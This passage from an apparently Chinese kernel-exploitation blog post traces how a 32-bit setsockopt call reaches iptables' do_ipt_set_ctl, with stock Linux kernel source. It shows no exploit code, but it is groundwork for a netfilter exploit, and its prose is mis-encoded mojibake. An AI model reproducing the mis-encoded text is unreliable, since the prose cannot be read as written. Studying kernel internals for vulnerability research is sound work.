&amp;&amp;<br>!ip_mroute_opt(optname))<br>err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(ip_setsockopt);<br></code></pre></td></tr></table></figure><p>è€Œ setsockopt ä¸ getsockopt å…¶å®éƒ½æ•´åˆåˆ°äº† <code>nf_sockopt()</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Call get/setsockopt() */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val,</span><br><span class="hljs-params">      <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get)<br>ret = ops-&gt;get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">nf_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val, <span class="hljs-type">char</span> __user *opt,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="hljs-number">0</span>);<br>&#125;<br>EXPORT_SYMBOL(nf_setsockopt);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çœ‹å‡ºå…¶é€šè¿‡ <code>nf_sockopt_find</code> æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°è¡¨ä»è€Œè°ƒç”¨å…¶å¯¹åº”çš„å‡½æ•°ï¼Œè¿™é‡Œ setsockopt å¯¹åº”è°ƒç”¨åˆ°çš„åº”è¯¥æ˜¯ <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªå‡½æ•°ï¼Ÿè¿™é‡Œæˆ‘ä»¬å›åˆ° <code>nf_sockopt_find</code> ä¸­ï¼Œå…¶ä½¿ç”¨å†…æ ¸åŒå‘é“¾è¡¨éå†å®éå†å…¨å±€å˜é‡<code>nf_sockopts</code>ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å‡½æ•°è¡¨çš„ pf ç­‰äºæˆ‘ä»¬åœ¨ä¸Šå±‚ä¼ å…¥çš„ pfï¼ˆåœ¨ <code>ip_setsockopt</code> ä¸­ä¼ å…¥çš„ä¸º <code>PF_INET</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åœ¨ iptables æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ä¸­æ³¨å†Œäº†å‡½æ•°è¡¨</strong> <code>ipt_sockopts</code>ï¼Œ<code>nf_register_sockopt()</code> ç”¨ä»¥åœ¨ <code>nf_sockopts</code> é“¾è¡¨ä¸­æ’å…¥èŠ‚ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸€åˆ‡å°±æ¸…æ¥šäº†ï¼Œå¯¹äº setsockopt ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆè°ƒç”¨çš„åº”è¯¥æ˜¯ <code>do_ipt_set_ctl</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="32-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨">32 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨</h2><blockquote><p>æœ¬æ¬¡æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬åˆ›å»º socket æ—¶ä½¿ç”¨ <code>socket(AF_INTE, SOCK_STREAM, 0)</code>ï¼Œæ•…åé¢æ¶‰åŠåˆ°çš„ socket æºç éƒ½ä¼šé¡ºç€è¿™ä¸ªè·¯å¾„åˆ†æ</p></blockquote><p>åœ¨è®¾ç½®äº† <code>CONFIG_COMPAT=y</code> çš„æƒ…å†µä¸‹ï¼ˆæ„ä¸ºå…¼å®¹ 32 ä½ï¼Œé»˜è®¤å¼€å¯ï¼‰ï¼Œ32ä½ç¨‹åºè¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶<strong>å®é™…ä¸Šæ˜¯é€šè¿‡ COMPAT_SYSCALL_DEFINE å®å®šä¹‰çš„å…¼å®¹ 32 ä½ç³»ç»Ÿè°ƒç”¨å®Œæˆçš„</strong></p><blockquote><p>æˆ‘ä»¬çŸ¥é“ 32 ä½ç¨‹åºé€šè¿‡ 0x80 å·ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè€Œ 64 ä½ç¨‹åºåˆ™é€šè¿‡ syscall æŒ‡ä»¤å®Œæˆç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤åœ¨64ä½å†…æ ¸ä¸­å°† 0x80 å·ä¸­æ–­ä¸“é—¨ç”¨ä½œå…¼å®¹ 32 ä½è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å…¥å£</p></blockquote><p>å› æ­¤å½“ä¸€ä¸ª 32 ä½ç¨‹åºè¿›è¡Œ setsockopt ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="hljs-type">int</span>, fd, <span class="hljs-type">int</span>, level, <span class="hljs-type">int</span>, optname,<br>       <span class="hljs-type">char</span> __user *, optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, optlen)<br>&#123;<br><span class="hljs-keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>å…¶å® glibc ä¸­çš„ setsockopt çš„ wrapper æ˜¯é€šè¿‡ <code>socketcall</code> è¿™ä¸€ç³»ç»Ÿè°ƒç”¨è¿›è¡Œçš„ï¼Œå®é™…ä¸Šåœ¨å¾ˆä¹…ä»¥å‰è¯¥ç³»ç»Ÿè°ƒç”¨å…¶å®æ˜¯ socket ç›¸å…³ç³»ç»Ÿè°ƒç”¨çš„å”¯ä¸€å…¥å£ç‚¹ï¼Œåé¢å„ç§å­åŠŸèƒ½æ‹†åˆ†æˆäº†å¤šä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯è¯¥ç³»ç»Ÿè°ƒç”¨ä»ç„¶ä¿ç•™äº†ä¸‹æ¥ï¼Œå› æ­¤å¯¹äºåŒä¸€ä¸ªåŠŸèƒ½ï¼Œå³å¯ä»¥èµ° socketcall ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥èµ°æ‹†åˆ†å‡ºæ¥çš„é‚£ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åçš„è·¯å¾„æ˜¯ç›¸åŒçš„</p></blockquote><p>åœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ•…åœ¨ <code>__compat_sys_setsockopt()</code>ä¸­æœ€ç»ˆä¼šèµ°åˆ° <code>sock-&gt;ops-&gt;compat_setsockopt</code> æˆ– <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __compat_sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><br><span class="hljs-keyword">if</span> (optlen &gt; INT_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock = sockfd_lookup(fd, &amp;err);<br><span class="hljs-keyword">if</span> (sock) &#123;<br>err = security_socket_setsockopt(sock, level, optname);<br><span class="hljs-keyword">if</span> (err) &#123;<br>sockfd_put(sock);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err = compat_sock_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)<br>err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span><br>err = sock-&gt;ops-&gt;setsockopt(sock, level,<br>optname, optval, optlen);<br>sockfd_put(sock);<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥èµ°å…¥å“ªæ¡è·¯å¾„ï¼Ÿé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦å…ˆçœ‹åˆ›å»ºè¯¥å‡½æ•°è¡¨çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªå‡½æ•°è¡¨å…¶å®æ˜¯åœ¨ socket åˆ›å»ºæ—¶ï¼ˆ<code>__sock_create()</code>ï¼‰è¿›è¡ŒåŠ¨æ€æŒ‡å®šçš„ï¼Œé€šè¿‡å¯¹åº” family æŒ‡å®šçš„åˆ›å»ºå‡½æ•°è¿›è¡Œåˆ›å»ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´å¯¹äº <code>AF_INET</code> ï¼ˆ<code>PF_INET</code>ï¼‰è€Œè¨€ï¼Œåº”è¯¥ç”¨åˆ°çš„æ˜¯ <code>inet_create()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>inet_init()</code> å‡½æ•°ä¸­ä½¿ç”¨ <code>sock_register</code> åœ¨ <code>net_families</code> æ•°ç»„ä¸­æ³¨å†Œäº†è¯¥ç»“æ„ä½“ï¼ˆ<code>__init</code> å®å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ¨¡å—åˆå§‹åŒ–å‡½æ•°ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>inet_create()</code> ä¸­ï¼Œåˆ™æ˜¯éå† æ•°ç»„æ‰¾åˆ°å¯¹åº”ç±»å‹çš„å‡½æ•°è¡¨ç»™åˆ° socketï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä½¿ç”¨å†…æ ¸çš„ rcu éå†å® <code>list_for_each_entry_rcu</code> å¯¹ <code>inetsw</code> è¿›è¡Œéå†ï¼Œå®é™…ä¸Šè¯¥é“¾è¡¨é€šè¿‡ <code>inetsw_array</code> å»ºç«‹ï¼Œå¯¹äº <code>IPPROTO_IP</code> è€Œè¨€å…¶å‡½æ•°è¡¨åº”ä¸º <code>inet_stream_ops</code>ï¼ˆæˆ‘ä»¬åœ¨å»ºç«‹ socket æ—¶ protocol æŒ‡å®šä¸º 0ï¼Œå³ <code>IPPROTO_IP</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åœ¨è¿›è¡Œ setsockopt æ—¶å…¶å®å¯¹åº”åº”è¯¥è°ƒç”¨åˆ° <code>inet_stream_ops</code> ä¸­çš„å‡½æ•°ï¼Œè¿™é‡Œå› ä¸ºæˆ‘ä»¬å¼€å¯äº†ç¼–è¯‘é€‰é¡¹ <code>CONFIG_COMPAT</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰ï¼Œ<strong>æ‰€ä»¥ setsockopt ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆåº”è¯¥ä¼šè°ƒç”¨åˆ°</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">inet_stream_ops</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_sock_common_setsockopt,<br>.compat_getsockopt = compat_sock_common_getsockopt,<br>.compat_ioctl   = inet_compat_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.set_rcvlowat   = tcp_set_rcvlowat,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä»–åˆä¼šè°ƒç”¨åˆ° <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>ï¼Œå…¶å®å°±æ˜¯ socket ç»“æ„ä½“é‡Œçš„ sock ç»“æ„ä½“é‡Œçš„ sock_common ç»“æ„ä½“çš„ <code>skc_prot</code> æˆå‘˜ï¼ˆ<code>proto</code> ç»“æ„ä½“ç±»å‹ï¼‰çš„ <code>compat_setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ<s>ä½ å¥—ä½ ğŸ¦„å‘¢</s>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,<br>      optval, optlen);<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_sock_common_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>åˆç»•å›åˆ° <code>inet_create</code>ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯¹åº”åˆ° <code>tcp_prot</code> å‡½æ•°è¡¨ï¼Œå¯¹åº”è°ƒç”¨åˆ° <code>compat_tcp_setsockopt()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> <span class="hljs-title">tcp_prot</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;TCP&quot;</span>,<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt= compat_tcp_setsockopt,<br>.compat_getsockopt= compat_tcp_getsockopt,<br><span 